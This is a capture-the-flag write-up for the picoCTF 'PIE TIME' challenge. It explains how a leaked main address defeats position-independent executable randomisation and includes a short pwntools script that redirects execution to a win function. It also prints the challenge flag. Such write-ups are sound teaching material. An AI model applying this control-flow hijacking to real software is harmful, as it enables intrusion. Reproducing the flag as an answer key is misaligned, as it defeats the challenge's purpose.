# [PIE TIME](https://play.picoctf.org/practice/challenge/490)  

## Challenge Information  
- **Category**: Binary Exploitation  
- **Difficulty**: Easy  
- **Description**: Can you try to get the flag? Beware we have PIE!  

## Solution Overview  
This challenge involves exploiting a binary with **Position Independent Executable (PIE)** enabled. PIE randomizes the base address of the binary in memory, making it harder to predict function addresses. Our goal is to bypass this protection and retrieve the flag.  

## Hints  
- Can you figure out what changed between the address you found locally and in the server output?  

## Detailed Walkthrough  

### Step 1: Disassembling the Binary  
#### Inspecting the Binary  
1. **Download the challenge binary and run basic analysis:**  
   ```bash
   lim@gettokari:~$ file vuln
   vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
   ```

   ```bash
   lim@gettokari:~$ checksec --file=vuln
   RELRO        STACK CANARY   NX          PIE          RPATH     RUNPATH      Symbols       FORTIFY Fortified    Fortifiable  FILE
   Full RELRO   Canary found   NX enabled  PIE enabled  No RPATH  No RUNPATH   78 Symbols      No    0            1            vuln
   ```
   - The `checksec` output confirms that **PIE is enabled**.  
   - This means function addresses will change across executions.  

2. **Find key functions in the binary:**  
    ```bash
    lim@gettokari:~$ objdump -d vuln | grep "<main>"
        11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi   # 133d <main>
    000000000000133d <main>:
        1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi   # 133d <main>
    ```
    ```bash
    lim@gettokari:~$ objdump -d vuln | grep "<win>"
    00000000000012a7 <win>:
    ```
    - The `win` function is at offset `0x12a7`.
    - The `main` function is at offset `0x133d`.

### Step 2: Leak a PIE Address  
- Identify an info leak that reveals an address from the binary.
    ```bash
    lim@gettokari:~/ctf$ nc rescued-float.picoctf.net 55759
    Address of main: 0x5c2b8ce0333d
    Enter the address to jump to, ex => 0x12345: 
    ```
- The challenge provides the address of `main`.

### Step 3: Calculate the Win Function Address  
- Since PIE shifts addresses by a random base, compute the `win` address using:  
   ```python
   win_address = main - 0x133d + 0x12a7
   ```
- This formula uses the leaked `main` address to calculate `win`'s actual address at runtime.

### Step 4: Build and Execute the Exploit  
```python
from pwn import *
t = remote('rescued-float.picoctf.net', 55759)
t.recvuntil(b"Address of main: ")  
main = int(t.recvline().strip(), 16)
t.sendlineafter(b": ", hex(main - 0x133d + 0x12a7).encode())
print(t.recvall().decode())
```

### Key Insights  
- **PIE randomization** requires an info leak to bypass.
- **Address calculation** allows targeting the `win` function.
- **Using pwntools** simplifies remote exploit execution.

## Tools and Resources Used  
- `checksec` (to check binary protections)  
- `objdump` (for disassembling binaries)
- `pwntools` (for exploit development)  

## Flag  
```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}
```

## Learning Points  
- How **PIE** works and how to bypass it  
- Finding **info leaks** to compute binary base addresses  
- Writing exploits for **PIE-enabled binaries**  

## References  
- [Understanding PIE in Binaries](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)